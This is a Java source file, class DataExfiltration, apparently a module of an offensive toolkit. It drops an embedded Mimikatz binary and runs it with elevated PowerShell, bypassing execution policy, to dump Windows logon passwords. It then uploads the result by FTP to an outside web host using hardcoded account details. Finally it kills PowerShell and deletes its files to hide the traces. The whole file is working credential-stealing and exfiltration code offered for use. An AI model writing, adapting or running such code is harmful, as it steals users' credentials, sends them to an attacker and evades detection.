package Modules;

import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.NoSuchFileException;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class DataExfiltration {
    public DataExfiltration() {
        // Make a powershell, and ftp script
        FileWriter writer = new FileWriter("t.ps1");
        writer.addLine("& .\\mm.exe localtime privilege::debug \"sekurlsa::logonpasswords full\" exit > i");
        writer.write();

        writer = new FileWriter("c.ftp");
        writer.addLine("open files.000webhost.com");
        writer.addLine("cromble459"); // USER
        writer.addLine("floorlayer"); // PASS
        writer.addLine("binary");
        writer.addLine("put i /public_html/uploads/i.txt");
        writer.addLine("disconnect");
        writer.addLine("quit");
        writer.write();

        // Copy MimiKatz
        if (!copy(getClass().getResourceAsStream("mm.exe"), System.getProperty("user.dir") + "\\mm.exe")) {
            cleanup();
            wait(3);
            return;
        }

        System.out.println();
        System.out.println("Running mimikatz.exe as admin");
        // Execute ps1 with admin privileges
        try {
            Runtime.getRuntime().exec("cmd /K powershell Start-Process -Verb runAs powershell 'cd "+System.getProperty("user.dir")+"; powershell -ExecutionPolicy Bypass .\\t.ps1;'");
        } catch (IOException e) {
            System.out.println("Mimikatz could not be run with admin privileges through powershell! Now existing...");
            cleanup();
            wait(3);
            return;
        }
        wait(5);

        System.out.println();
        System.out.println("Send results with ftp");
        // Send with ftp
        try {
            Runtime.getRuntime().exec("cmd /c ftp -i -s:c.ftp");
            wait(2);
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Cleanup
        wait(5);
        cleanup();
    }

    public void cleanup() {
        try {
            Runtime.getRuntime().exec("powershell Get-Process powershell | Stop-Process");
            Files.deleteIfExists(Paths.get(System.getProperty("user.dir") + "\\mm.exe"));
            Files.deleteIfExists(Paths.get(System.getProperty("user.dir") + "\\c.ftp"));
            Files.deleteIfExists(Paths.get(System.getProperty("user.dir") + "\\t.ps1"));
            Files.deleteIfExists(Paths.get(System.getProperty("user.dir") + "\\i"));
        } catch (NoSuchFileException e) {
            System.err.println("No such file/directory exists");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void wait(int secs) {
        long start = System.currentTimeMillis();
        long now = System.currentTimeMillis();
        while (now - start < secs*1000) {
            now = System.currentTimeMillis();
        }
    }

    public static boolean copy(InputStream source , String destination) {
        System.out.println("Copying ->" + "mimikatz.exe" + "\nto ->" + destination);

        try {
            Files.copy(source, Paths.get(destination), StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException ex) {
            System.out.println("An error occurred whilst copying mimkiatz!");
            return false;
        }
        System.out.println("Done!");

        return true;
    }
}
